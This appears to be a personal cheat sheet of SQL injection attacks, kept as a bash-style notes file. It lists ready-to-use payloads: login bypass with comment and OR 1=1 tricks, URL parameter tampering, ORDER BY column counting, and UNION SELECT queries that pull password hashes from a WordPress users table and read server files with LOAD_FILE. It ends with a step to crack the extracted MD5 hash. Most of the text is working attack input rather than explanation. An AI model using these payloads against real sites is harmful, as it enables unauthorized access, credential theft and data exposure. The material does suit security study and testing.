#!/bin/bash

#sql injection - log in bypass

SELECT * FROM TESTTABLE WHERE USERNAME = '$_POST['USERNAME']' AND PASSWORD = '$_POST['PASS']'


# form - comment out username with comma and hash - admin' #

#  admin' #


#statement server side

SELECT * FROM TESTTABLE WHERE USERNAME = 'ADMIN' #' AND PASSWORD = 'ANYTHING'


# or statement

 username = admin

# password = blah' OR 1 = 1 #

#--------------------------------------------------------------------------------------#

# password = blah' OR 'a'='a

#--------------------------------------------------------------------------------------#

# manipulate variables

# http://somesite.com/?page_id=5&user=1

# add some extra code to the end of the variable

# or 1=1--

# http://somesite.com/?page_id=5&user=1 or 1=1--

#--------------------------------------------------------------------------------------#

# test false statment

# and 0=1--

#--------------------------------------------------------------------------------------#


# unexpected data

# user=blah

#--------------------------------------------------------------------------------------#

# find how many columns, increment until you get an errror

# ORDER BY 1--

# input: ORDER BY 1--

# input: ORDER BY 2--


# null for each column
# input: union select null, null, null, null, null--


# put in a number for each null
# input: union select 1, 2, 3, 4, 5--


# find the column number to target


# input: union select null, user_pass, null, null, null from wp_users--

# extract the hash
# input: union select null, user_pass, null, null, null from wp_users where id=1--

#--------------------------------------------------------------------------------------#


# crack the md5 hash

#--------------------------------------------------------------------------------------#


# load files

# input: union select null,LOAD_FILE("boot.ini"),null,null--

# comments are escaped so you need to be hex values in



